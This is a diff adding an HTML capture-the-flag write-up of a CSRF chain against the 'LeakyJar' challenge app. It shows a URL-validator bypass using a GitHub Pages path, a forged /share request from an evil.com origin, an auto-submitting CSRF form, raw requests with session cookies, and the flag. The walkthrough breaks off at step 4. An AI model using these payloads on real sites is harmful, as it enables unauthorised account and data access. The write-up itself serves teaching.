@@ -1,0 +1,1006 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LeakyJar — CSRF Chain Writeup</title>
+<style>
+  :root {
+    --bg:      #0a0d14;
+    --bg2:     #0f1320;
+    --bg3:     #151b2e;
+    --border:  #1e2740;
+    --accent:  #7c6af7;
+    --accent2: #a594ff;
+    --amber:   #f59e0b;
+    --red:     #f43f5e;
+    --green:   #10b981;
+    --text:    #e2e8f0;
+    --text2:   #94a3b8;
+    --text3:   #4a5568;
+    --mono:    'SF Mono','Fira Code',Menlo,monospace;
+    --sans:    -apple-system,BlinkMacSystemFont,'Helvetica Neue',Arial,sans-serif;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { font-size: 16px; scroll-behavior: smooth; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    -webkit-font-smoothing: antialiased;
+    min-height: 100vh;
+  }
+
+  /* ── STICKY NAV ── */
+  nav {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    z-index: 100;
+    height: 56px;
+    background: rgba(10,13,20,0.92);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    padding: 0 40px;
+    justify-content: space-between;
+  }
+
+  .nav-brand {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 0.8rem;
+    font-weight: 700;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: var(--text2);
+  }
+  .nav-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--accent);
+    box-shadow: 0 0 8px var(--accent);
+  }
+
+  .nav-links {
+    display: flex;
+    gap: 32px;
+    list-style: none;
+  }
+  .nav-links a {
+    font-size: 0.78rem;
+    color: var(--text3);
+    text-decoration: none;
+    letter-spacing: 0.04em;
+    transition: color 0.15s;
+  }
+  .nav-links a:hover { color: var(--text); }
+
+  .nav-badge {
+    background: #16213a;
+    border: 1px solid var(--accent);
+    color: var(--accent2);
+    font-size: 0.68rem;
+    font-weight: 700;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    padding: 4px 12px;
+    border-radius: 20px;
+  }
+
+  /* ── HERO ── */
+  .hero {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    padding: 100px 80px 80px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .hero::before {
+    content: '';
+    position: absolute;
+    top: -200px; right: -200px;
+    width: 700px; height: 700px;
+    background: radial-gradient(circle, rgba(124,106,247,0.12) 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  .hero::after {
+    content: '';
+    position: absolute;
+    bottom: -100px; left: -100px;
+    width: 500px; height: 500px;
+    background: radial-gradient(circle, rgba(244,63,94,0.07) 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  .hero-eyebrow {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 32px;
+  }
+
+  .pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    padding: 4px 14px;
+    font-size: 0.7rem;
+    font-weight: 600;
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    color: var(--text2);
+    background: var(--bg2);
+  }
+  .pill.red { border-color: rgba(244,63,94,0.4); color: #fb7185; background: rgba(244,63,94,0.08); }
+  .pill.amber { border-color: rgba(245,158,11,0.4); color: #fbbf24; background: rgba(245,158,11,0.08); }
+  .pill.purple { border-color: rgba(124,106,247,0.4); color: var(--accent2); background: rgba(124,106,247,0.08); }
+
+  h1 {
+    font-size: clamp(3rem, 7vw, 5.5rem);
+    font-weight: 900;
+    letter-spacing: -0.04em;
+    line-height: 1.0;
+    color: #fff;
+    margin-bottom: 28px;
+    max-width: 900px;
+  }
+
+  h1 span { color: var(--accent2); }
+
+  .hero-desc {
+    font-size: 1.1rem;
+    color: var(--text2);
+    line-height: 1.7;
+    max-width: 560px;
+    margin-bottom: 48px;
+  }
+
+  .hero-stats {
+    display: flex;
+    gap: 0;
+    flex-wrap: wrap;
+  }
+
+  .stat {
+    padding: 20px 36px 20px 0;
+    margin-right: 36px;
+    border-right: 1px solid var(--border);
+  }
+  .stat:last-child { border-right: none; margin-right: 0; }
+  .stat-val {
+    font-size: 1.8rem;
+    font-weight: 800;
+    letter-spacing: -0.03em;
+    color: #fff;
+    line-height: 1;
+    margin-bottom: 6px;
+  }
+  .stat-val.purple { color: var(--accent2); }
+  .stat-val.amber  { color: #fbbf24; }
+  .stat-val.red    { color: #fb7185; }
+  .stat-label {
+    font-size: 0.72rem;
+    color: var(--text3);
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    font-weight: 600;
+  }
+
+  /* ── SECTIONS ── */
+  section {
+    padding: 80px;
+    border-top: 1px solid var(--border);
+  }
+
+  section.alt { background: var(--bg2); }
+  section.dark { background: var(--bg3); }
+
+  .section-label {
+    font-size: 0.68rem;
+    font-weight: 800;
+    letter-spacing: 0.16em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .section-label::after {
+    content: '';
+    flex: 1;
+    max-width: 40px;
+    height: 1px;
+    background: var(--accent);
+    opacity: 0.4;
+  }
+
+  h2 {
+    font-size: 2rem;
+    font-weight: 800;
+    letter-spacing: -0.03em;
+    color: #fff;
+    margin-bottom: 24px;
+    line-height: 1.2;
+  }
+
+  h3 {
+    font-size: 1rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 12px;
+  }
+
+  p {
+    font-size: 0.97rem;
+    color: var(--text2);
+    line-height: 1.8;
+    margin-bottom: 16px;
+    max-width: 680px;
+  }
+  p:last-child { margin-bottom: 0; }
+
+  code {
+    font-family: var(--mono);
+    font-size: 0.83em;
+    background: rgba(124,106,247,0.12);
+    border: 1px solid rgba(124,106,247,0.2);
+    padding: 1px 7px;
+    border-radius: 4px;
+    color: var(--accent2);
+  }
+
+  a { color: var(--accent2); text-decoration: none; }
+
+  /* ── TWO-COL ── */
+  .two-col {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 48px;
+    align-items: start;
+  }
+
+  .two-col.wide { grid-template-columns: 1fr 1.4fr; }
+
+  @media (max-width: 900px) {
+    .two-col, .two-col.wide { grid-template-columns: 1fr; }
+    section { padding: 60px 32px; }
+    .hero { padding: 100px 32px 60px; }
+    nav { padding: 0 24px; }
+    .nav-links { display: none; }
+  }
+
+  /* ── CODE BLOCK ── */
+  .cblock { margin: 20px 0; border-radius: 10px; overflow: hidden; border: 1px solid var(--border); }
+
+  .cblock-bar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: var(--bg3);
+    padding: 9px 16px;
+    border-bottom: 1px solid var(--border);
+  }
+  .cblock-title {
+    font-family: var(--mono);
+    font-size: 0.7rem;
+    color: var(--text3);
+    font-weight: 600;
+    letter-spacing: 0.04em;
+  }
+  .cblock-dots { display: flex; gap: 5px; }
+  .cblock-dots span {
+    width: 10px; height: 10px;
+    border-radius: 50%;
+    background: var(--border);
+  }
+
+  pre {
+    background: #06090f;
+    padding: 20px 22px;
+    overflow-x: auto;
+    font-family: var(--mono);
+    font-size: 0.8rem;
+    line-height: 1.7;
+    color: #8baabf;
+    margin: 0;
+  }
+
+  pre .hi  { color: #fbbf24; font-weight: 600; }
+  pre .k   { color: #7c6af7; }
+  pre .v   { color: #a3e7c4; }
+  pre .h   { color: #93c5fd; }
+  pre .c   { color: #334155; font-style: italic; }
+  pre .bad { color: #f87171; }
+  pre .ok  { color: #34d399; }
+
+  /* ── WEAKNESS CARDS ── */
+  .weakness-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 2px;
+    margin: 40px 0;
+    border-radius: 12px;
+    overflow: hidden;
+    border: 1px solid var(--border);
+  }
+
+  @media (max-width: 900px) { .weakness-grid { grid-template-columns: 1fr; } }
+
+  .wcard {
+    background: var(--bg2);
+    padding: 32px 28px;
+    position: relative;
+    transition: background 0.2s;
+  }
+  .wcard:hover { background: var(--bg3); }
+
+  .wcard-num {
+    font-family: var(--mono);
+    font-size: 3rem;
+    font-weight: 900;
+    line-height: 1;
+    margin-bottom: 20px;
+    opacity: 0.12;
+    color: #fff;
+    position: absolute;
+    top: 20px; right: 24px;
+  }
+
+  .wcard-icon {
+    width: 38px; height: 38px;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 16px;
+  }
+  .wcard-icon.purple { background: rgba(124,106,247,0.15); color: var(--accent2); }
+  .wcard-icon.red    { background: rgba(244,63,94,0.12); color: #fb7185; }
+  .wcard-icon.amber  { background: rgba(245,158,11,0.12); color: #fbbf24; }
+
+  .wcard h3 { font-size: 0.95rem; margin-bottom: 10px; }
+  .wcard p  { font-size: 0.83rem; max-width: none; line-height: 1.65; }
+
+  .wcard-tag {
+    display: inline-block;
+    margin-top: 16px;
+    font-size: 0.65rem;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    padding: 3px 10px;
+    border-radius: 4px;
+  }
+  .wcard-tag.purple { background: rgba(124,106,247,0.15); color: var(--accent2); }
+  .wcard-tag.red    { background: rgba(244,63,94,0.12); color: #fb7185; }
+  .wcard-tag.amber  { background: rgba(245,158,11,0.12); color: #fbbf24; }
+
+  /* ── FLOW DIAGRAM ── */
+  .flow-wrap {
+    background: #06090f;
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 48px 40px;
+    margin: 40px 0;
+    overflow-x: auto;
+  }
+
+  /* ── ATTACK STEPS ── */
+  .steps { margin: 32px 0; }
+  .step {
+    display: grid;
+    grid-template-columns: 56px 1fr;
+    gap: 0 24px;
+    margin-bottom: 4px;
+  }
+  .step-num-col {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  .step-circle {
+    width: 40px; height: 40px;
+    border-radius: 50%;
+    border: 1px solid var(--accent);
+    background: rgba(124,106,247,0.1);
+    color: var(--accent2);
+    font-size: 0.8rem;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    font-family: var(--mono);
+  }
+  .step-line {
+    flex: 1;
+    width: 1px;
+    background: var(--border);
+    margin: 6px 0;
+    min-height: 24px;
+  }
+  .step:last-child .step-line { display: none; }
+  .step-body { padding: 8px 0 36px; }
+  .step-title { font-size: 1rem; font-weight: 700; color: #fff; margin-bottom: 12px; }
+  .step-body p { max-width: none; font-size: 0.9rem; }
+
+  /* ── TABLE ── */
+  .tbl-wrap {
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+    margin: 24px 0;
+  }
+  table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+  thead tr { background: var(--bg3); border-bottom: 1px solid var(--border); }
+  th {
+    text-align: left;
+    padding: 12px 18px;
+    font-size: 0.68rem;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--text3);
+  }
+  td {
+    padding: 11px 18px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text2);
+    font-family: var(--mono);
+    font-size: 0.8rem;
+  }
+  tr:last-child td { border-bottom: none; }
+  .pass { color: #34d399; font-weight: 600; font-family: var(--sans); }
+  .fail { color: #f87171; font-weight: 600; font-family: var(--sans); }
+
+  /* ── FLAG ── */
+  .flag-hero {
+    background: linear-gradient(135deg, rgba(124,106,247,0.15), rgba(124,106,247,0.05));
+    border: 1px solid rgba(124,106,247,0.3);
+    border-radius: 16px;
+    padding: 48px;
+    margin: 40px 0;
+    display: flex;
+    align-items: center;
+    gap: 32px;
+    flex-wrap: wrap;
+  }
+  .flag-icon {
+    width: 56px; height: 56px;
+    background: rgba(124,106,247,0.2);
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--accent2);
+    flex-shrink: 0;
+  }
+  .flag-label {
+    font-size: 0.65rem;
+    font-weight: 800;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 10px;
+  }
+  .flag-val {
+    font-family: var(--mono);
+    font-size: 1.1rem;
+    color: #fff;
+    font-weight: 600;
+    letter-spacing: 0.01em;
+  }
+
+  /* ── FIX CARDS ── */
+  .fix-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 20px; margin: 32px 0; }
+  @media (max-width: 900px) { .fix-grid { grid-template-columns: 1fr; } }
+
+  .fix-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 24px;
+  }
+  .fix-card-num {
+    font-family: var(--mono);
+    font-size: 0.68rem;
+    color: var(--accent);
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    margin-bottom: 12px;
+  }
+  .fix-card h3 { font-size: 0.9rem; margin-bottom: 10px; }
+  .fix-card p  { font-size: 0.83rem; max-width: none; margin-bottom: 0; }
+
+  /* ── FOOTER ── */
+  footer {
+    background: var(--bg);
+    border-top: 1px solid var(--border);
+    padding: 32px 80px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 12px;
+  }
+  .footer-left { font-size: 0.75rem; color: var(--text3); letter-spacing: 0.04em; }
+  .footer-right { display: flex; align-items: center; gap: 16px; }
+  .footer-link {
+    font-size: 0.75rem;
+    color: var(--text3);
+    text-decoration: none;
+    transition: color 0.15s;
+  }
+  .footer-link:hover { color: var(--accent2); }
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-brand">
+    <span class="nav-dot"></span>
+    LeakyJar &nbsp;/&nbsp; CSRF Writeup
+  </div>
+  <ul class="nav-links">
+    <li><a href="#app">The App</a></li>
+    <li><a href="#weaknesses">Weaknesses</a></li>
+    <li><a href="#attack">Attack</a></li>
+    <li><a href="#flag">Flag</a></li>
+    <li><a href="#fix">Fix</a></li>
+  </ul>
+  <span class="nav-badge">Accepted · Medium</span>
+</nav>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-eyebrow">
+    <span class="pill purple">CSRF</span>
+    <span class="pill amber">SameSite=None</span>
+    <span class="pill red">Admin Vault Disclosure</span>
+  </div>
+
+  <h1>Three wrong.<br><span>One flag.</span></h1>
+
+  <p class="hero-desc">
+    The session cookie had one bad attribute. The share endpoint had no protection.
+    The bot's URL validator used a string match. None of these alone was enough.
+    Combined — full admin vault read in under thirty seconds.
+  </p>
+
+  <div class="hero-stats">
+    <div class="stat">
+      <div class="stat-val purple">CSRF</div>
+      <div class="stat-label">Vulnerability Type</div>
+    </div>
+    <div class="stat">
+      <div class="stat-val amber">Medium</div>
+      <div class="stat-label">Severity</div>
+    </div>
+    <div class="stat">
+      <div class="stat-val red">&lt;30s</div>
+      <div class="stat-label">Time to Flag</div>
+    </div>
+    <div class="stat">
+      <div class="stat-val" style="color:#34d399">3</div>
+      <div class="stat-label">Weaknesses Chained</div>
+    </div>
+  </div>
+</div>
+
+<!-- THE APP -->
+<section id="app" class="alt">
+  <div class="two-col wide">
+    <div>
+      <div class="section-label">01 &nbsp; Context</div>
+      <h2>What is LeakyJar?</h2>
+      <p>
+        A cookie-recipe sharing app. Register, get a private <strong style="color:#fff">vault</strong> —
+        a recipe box storing names and notes. The notes field is literally called
+        <code>password</code> in the form. Share your vault with another user and
+        they get full read access to every recipe and note inside.
+      </p>
+      <p>
+        There is an admin account. Its vault holds the flag. There is a bot at
+        <code>/submit</code> — send it a URL, it visits as admin, reviews the page.
+        That bot is the only attack surface that matters.
+      </p>
+      <p>
+        Goal: get the bot to share the admin vault with the attacker account.
+      </p>
+    </div>
+    <div>
+      <div class="cblock">
+        <div class="cblock-bar">
+          <div class="cblock-dots"><span></span><span></span><span></span></div>
+          <div class="cblock-title">App endpoints</div>
+        </div>
+        <pre><span class="h">GET</span>  /               landing page
+<span class="h">POST</span> /register       create account
+<span class="h">POST</span> /login          authenticate
+<span class="h">GET</span>  /vault          your recipe box
+<span class="h">POST</span> /vault/add      add a recipe
+<span class="h">POST</span> /share          share vault with user  <span class="hi">← target</span>
+<span class="h">POST</span> /submit         submit URL to admin bot <span class="hi">← entry</span>
+<span class="h">GET</span>  /vault/:uuid    read a shared vault</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- WEAKNESSES -->
+<section id="weaknesses">
+  <div class="section-label">02 &nbsp; Root Cause</div>
+  <h2>Three things were broken</h2>
+  <p>Each one independently is a finding. Together they are a chain. Remove any single link and the attack fails.</p>
+
+  <div class="weakness-grid">
+    <div class="wcard">
+      <div class="wcard-num">01</div>
+      <div class="wcard-icon purple">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.75"/><path d="M12 8v4l2 2" stroke="currentColor" stroke-width="1.75" stroke-linecap="round"/></svg>
+      </div>
+      <h3>SameSite=None on Session Cookie</h3>
+      <p>The browser attaches this cookie to every request regardless of origin — including cross-origin form POSTs from domains the victim never chose to visit.</p>
+      <span class="wcard-tag purple">Enables cross-origin delivery</span>
+    </div>
+
+    <div class="wcard" style="border-left:1px solid var(--border);border-right:1px solid var(--border)">
+      <div class="wcard-num">02</div>
+      <div class="wcard-icon red">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><rect x="3" y="8" width="18" height="13" rx="2" stroke="currentColor" stroke-width="1.75"/><path d="M8 8V6a4 4 0 1 1 8 0v2" stroke="currentColor" stroke-width="1.75" stroke-linecap="round"/></svg>
+      </div>
+      <h3>No CSRF Token on /share</h3>
+      <p>The share form has no hidden token, no nonce. The server checks neither <code style="background:rgba(244,63,94,0.12);border-color:rgba(244,63,94,0.2);color:#fb7185">Origin</code> nor <code style="background:rgba(244,63,94,0.12);border-color:rgba(244,63,94,0.2);color:#fb7185">Referer</code>. Any POST with a valid session cookie succeeds.</p>
+      <span class="wcard-tag red">Allows forged state change</span>
+    </div>
+
+    <div class="wcard">
+      <div class="wcard-num">03</div>
+      <div class="wcard-icon amber">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" stroke="currentColor" stroke-width="1.75" stroke-linecap="round"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" stroke="currentColor" stroke-width="1.75" stroke-linecap="round"/></svg>
+      </div>
+      <h3>URL Validator Uses a Blocklist</h3>
+      <p>The validator does a raw string match on the URL — not a hostname parse. A GitHub Pages URL with <code style="background:rgba(245,158,11,0.1);border-color:rgba(245,158,11,0.2);color:#fbbf24">leakyjar.intigriti.io</code> in the path passes, but the bot visits GitHub's servers — a page the attacker controls.</p>
+      <span class="wcard-tag amber">Delivers payload to bot</span>
+    </div>
+  </div>
+
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;margin-top:8px">
+    <div class="cblock">
+      <div class="cblock-bar">
+        <div class="cblock-dots"><span></span><span></span><span></span></div>
+        <div class="cblock-title">Set-Cookie on /register response</div>
+      </div>
+      <pre>Set-Cookie: session=eyJ1c2VyI...;
+  Secure; HttpOnly; Path=/;
+  <span class="hi">SameSite=None</span>  <span class="c">← should be Lax</span></pre>
+    </div>
+    <div class="cblock">
+      <div class="cblock-bar">
+        <div class="cblock-dots"><span></span><span></span><span></span></div>
+        <div class="cblock-title">Origin: evil.com → 302 accepted</div>
+      </div>
+      <pre><span class="k">POST</span> /share
+<span class="h">Origin:</span> <span class="bad">https://evil.com</span>
+Cookie: session=&lt;victim&gt;
+
+username=attacker
+
+<span class="ok">HTTP/1.1 302 Found</span>  <span class="c">← no rejection</span></pre>
+    </div>
+  </div>
+
+  <div style="margin-top:24px">
+    <div class="cblock">
+      <div class="cblock-bar">
+        <div class="cblock-dots"><span></span><span></span><span></span></div>
+        <div class="cblock-title">URL validator — string match bypass</div>
+      </div>
+      <pre><span class="c"># Rejected (blocklist entries):</span>
+<span class="bad">https://lhr.life/...                               ← rejected</span>
+<span class="bad">https://127.0.0.1/...                              ← rejected</span>
+<span class="bad">https://leakyjar.intigriti.io.evil.com             ← rejected</span>
+
+<span class="c"># Path contains "leakyjar.intigriti.io" → passes string match:</span>
+<span class="ok">https://techiesiddhi.github.io/poc/<span class="hi">leakyjar.intigriti.io</span>/</span>
+<span class="c"># Bot visits techiesiddhi.github.io — attacker's page</span></pre>
+    </div>
+  </div>
+</section>
+
+<!-- ATTACK -->
+<section id="attack" class="alt">
+  <div class="section-label">03 &nbsp; Exploitation</div>
+  <h2>The Attack</h2>
+
+  <!-- SEQUENCE DIAGRAM -->
+  <div class="flow-wrap">
+    <svg viewBox="0 0 760 500" xmlns="http://www.w3.org/2000/svg"
+         style="width:100%;max-width:760px;display:block;margin:0 auto;font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',sans-serif">
+
+      <!-- Actor columns: Attacker=120, Bot=380, Server=640 -->
+
+      <!-- Actor boxes -->
+      <rect x="34" y="16" width="172" height="44" rx="7" fill="#0f1320" stroke="#7c6af7" stroke-width="1.2"/>
+      <text x="120" y="43" text-anchor="middle" fill="#a594ff" font-size="11" font-weight="700" letter-spacing="0.06em">ATTACKER</text>
+
+      <rect x="294" y="16" width="172" height="44" rx="7" fill="#0f1320" stroke="#1e2740" stroke-width="1.2"/>
+      <text x="380" y="43" text-anchor="middle" fill="#94a3b8" font-size="11" font-weight="700" letter-spacing="0.06em">ADMIN BOT</text>
+
+      <rect x="554" y="16" width="172" height="44" rx="7" fill="#0f1320" stroke="#1e2740" stroke-width="1.2"/>
+      <text x="640" y="43" text-anchor="middle" fill="#94a3b8" font-size="11" font-weight="700" letter-spacing="0.06em">LEAKYJAR</text>
+
+      <!-- Lifelines -->
+      <line x1="120" y1="60" x2="120" y2="484" stroke="#1e2740" stroke-width="1" stroke-dasharray="5,4"/>
+      <line x1="380" y1="60" x2="380" y2="484" stroke="#1e2740" stroke-width="1" stroke-dasharray="5,4"/>
+      <line x1="640" y1="60" x2="640" y2="484" stroke="#1e2740" stroke-width="1" stroke-dasharray="5,4"/>
+
+      <!-- ① Attacker → Server: POST /register -->
+      <line x1="120" y1="100" x2="632" y2="100" stroke="#4a5568" stroke-width="1.2"/>
+      <polygon points="630,96.5 638,100 630,103.5" fill="#4a5568"/>
+      <rect x="280" y="84" width="160" height="18" rx="4" fill="#06090f"/>
+      <text x="360" y="97" text-anchor="middle" fill="#64748b" font-size="9.5" font-weight="600">POST /register</text>
+
+      <!-- ① response -->
+      <line x1="640" y1="124" x2="128" y2="124" stroke="#4a5568" stroke-width="1" stroke-dasharray="4,3"/>
+      <polygon points="130,120.5 122,124 130,127.5" fill="#4a5568"/>
+      <rect x="280" y="108" width="160" height="18" rx="4" fill="#06090f"/>
+      <text x="360" y="121" text-anchor="middle" fill="#334155" font-size="9" font-style="italic">302 + SameSite=None cookie</text>
+
+      <!-- ② Attacker → Server: POST /submit -->
+      <line x1="120" y1="172" x2="632" y2="172" stroke="#4a5568" stroke-width="1.2"/>
+      <polygon points="630,168.5 638,172 630,175.5" fill="#4a5568"/>
+      <rect x="272" y="156" width="176" height="18" rx="4" fill="#06090f"/>
+      <text x="360" y="169" text-anchor="middle" fill="#64748b" font-size="9.5" font-weight="600">POST /submit  (CSRF page URL)</text>
+
+      <!-- ② response -->
+      <line x1="640" y1="196" x2="128" y2="196" stroke="#4a5568" stroke-width="1" stroke-dasharray="4,3"/>
+      <polygon points="130,192.5 122,196 130,199.5" fill="#4a5568"/>
+      <rect x="272" y="180" width="176" height="18" rx="4" fill="#06090f"/>
+      <text x="360" y="193" text-anchor="middle" fill="#334155" font-size="9" font-style="italic">200 · Baker will check it shortly</text>
+
+      <!-- ③ Server triggers Bot -->
+      <line x1="640" y1="244" x2="388" y2="244" stroke="#f59e0b" stroke-width="1.2" stroke-dasharray="5,3"/>
+      <polygon points="390,240.5 382,244 390,247.5" fill="#f59e0b"/>
+      <rect x="484" y="228" width="152" height="18" rx="4" fill="#06090f"/>
+      <text x="560" y="241" text-anchor="middle" fill="#92400e" font-size="9" font-weight="600">triggers visit</text>
+
+      <!-- ④ Bot → Server: POST /share (THE CSRF) -->
+      <rect x="362" y="268" width="36" height="104" rx="4" fill="#16102a" stroke="#7c6af7" stroke-width="1"/>
+
+      <line x1="380" y1="290" x2="632" y2="290" stroke="#7c6af7" stroke-width="1.5"/>
+      <polygon points="630,286.5 638,290 630,293.5" fill="#7c6af7"/>
+      <rect x="440" y="274" width="156" height="18" rx="4" fill="#06090f"/>
+      <text x="518" y="287" text-anchor="middle" fill="#a594ff" font-size="9.5" font-weight="700">POST /share</text>
+
+      <!-- cookie label -->
+      <rect x="440" y="296" width="156" height="18" rx="4" fill="#16102a" stroke="#7c6af7" stroke-width="0.8"/>
+      <text x="518" y="309" text-anchor="middle" fill="#7c6af7" font-size="8.5" font-weight="600">Cookie: admin_session  ← SameSite=None</text>
+
+      <!-- ④ server response -->
+      <line x1="640" y1="340" x2="388" y2="340" stroke="#7c6af7" stroke-width="1" stroke-dasharray="4,3"/>
+      <polygon points="390,336.5 382,340 390,343.5" fill="#7c6af7"/>
+      <rect x="440" y="324" width="156" height="18" rx="4" fill="#06090f"/>
+      <text x="518" y="337" text-anchor="middle" fill="#334155" font-size="9" font-style="italic">302 → /vault  ·  share complete</text>
+
+      <!-- ⑤ Attacker → Server: GET /vault -->
+      <line x1="120" y1="400" x2="632" y2="400" stroke="#10b981" stroke-width="1.5"/>
+      <polygon points="630,396.5 638,400 630,403.5" fill="#10b981"/>
+      <rect x="272" y="384" width="176" height="18" rx="4" fill="#06090f"/>
+      <text x="360" y="397" text-anchor="middle" fill="#059669" font-size="9.5" font-weight="700">GET /vault/f09ac8fe-...</text>
+
+      <!-- ⑤ response: FLAG -->
+      <line x1="640" y1="428" x2="128" y2="428" stroke="#10b981" stroke-width="1.5" stroke-dasharray="4,3"/>
+      <polygon points="130,424.5 122,428 130,431.5" fill="#10b981"/>
+      <rect x="224" y="412" width="272" height="22" rx="4" fill="#0a2a18" stroke="#10b981" stroke-width="0.8"/>
+      <text x="360" y="427" text-anchor="middle" fill="#34d399" font-size="10" font-weight="700">200 · INTIGRITI{019ef404-1e44-7748-bdcf-ca7b12dbfee0}</text>
+
+      <!-- Step labels on left -->
+      <text x="18" y="103" fill="#334155" font-size="8.5" font-weight="700">①</text>
+      <text x="18" y="175" fill="#334155" font-size="8.5" font-weight="700">②</text>
+      <text x="622" y="247" fill="#92400e" font-size="8.5" font-weight="700">③</text>
+      <text x="18" y="293" fill="#7c6af7" font-size="8.5" font-weight="700">④</text>
+      <text x="18" y="403" fill="#10b981" font-size="8.5" font-weight="700">⑤</text>
+    </svg>
+  </div>
+
+  <div class="steps">
+    <div class="step">
+      <div class="step-num-col">
+        <div class="step-circle">01</div>
+        <div class="step-line"></div>
+      </div>
+      <div class="step-body">
+        <div class="step-title">Register attacker account</div>
+        <div class="cblock">
+          <div class="cblock-bar">
+            <div class="cblock-dots"><span></span><span></span><span></span></div>
+            <div class="cblock-title">POST /register</div>
+          </div>
+          <pre><span class="k">POST</span> /register HTTP/1.1
+Host: leakyjar.intigriti.io
+
+username=h4ckzor99&password=letmein321
+
+<span class="h">HTTP/1.1 302 Found</span>
+Set-Cookie: session=eyJ1c2VyIjoiaDRja3pvcjk5In0.aj9utQ._U3ix7ihof2t0i5_BG4f_AOzBrg; Secure; HttpOnly; <span class="hi">SameSite=None</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num-col">
+        <div class="step-circle">02</div>
+        <div class="step-line"></div>
+      </div>
+      <div class="step-body">
+        <div class="step-title">Host CSRF page on GitHub Pages</div>
+        <p>Path contains <code>leakyjar.intigriti.io</code> as a directory name — passes the bot's string-match check. GitHub Pages serves it with no CSP, so the form fires immediately on load.</p>
+        <div class="cblock">
+          <div class="cblock-bar">
+            <div class="cblock-dots"><span></span><span></span><span></span></div>
+            <div class="cblock-title">techiesiddhi.github.io/poc/leakyjar.intigriti.io/index.html</div>
+          </div>
+          <pre><span class="k">&lt;form</span> id=<span class="v">"f"</span> method=<span class="v">"POST"</span> action=<span class="v">"https://leakyjar.intigriti.io/share"</span><span class="k">&gt;</span>
+  &lt;input type=<span class="v">"hidden"</span> name=<span class="v">"username"</span> value=<span class="v">"h4ckzor99"</span>&gt;
+<span class="k">&lt;/form&gt;</span>
+&lt;script&gt;document.getElementById(<span class="v">'f'</span>).submit();&lt;/script&gt;</pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num-col">
+        <div class="step-circle">03</div>
+        <div class="step-line"></div>
+      </div>
+      <div class="step-body">
+        <div class="step-title">Submit URL to admin bot</div>
+        <div class="cblock">
+          <div class="cblock-bar">
+            <div class="cblock-dots"><span></span><span></span><span></span></div>
+            <div class="cblock-title">POST /submit</div>
+          </div>
+          <pre><span class="k">POST</span> /submit HTTP/1.1
+Host: leakyjar.intigriti.io
+Cookie: session=eyJ1c2VyIjoiaDRja3pvcjk5In0.aj9wlw.pvWcT51BZpTu6JMxwnWqfPfbpJc
+
+url=https%3A%2F%2Ftechiesiddhi.github.io%2Fpoc%2Fleakyjar.intigriti.io%2F
+
+<span class="ok">Sent — the Master Baker will check it shortly.</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num-col">
+        <div class="step-circle">04</div>
+        <div class="step-line"></div>
+      </div>
+      <div class="step-body">
+        <div class="step-title">Bot visits — CSRF fires with admin cookie</div>
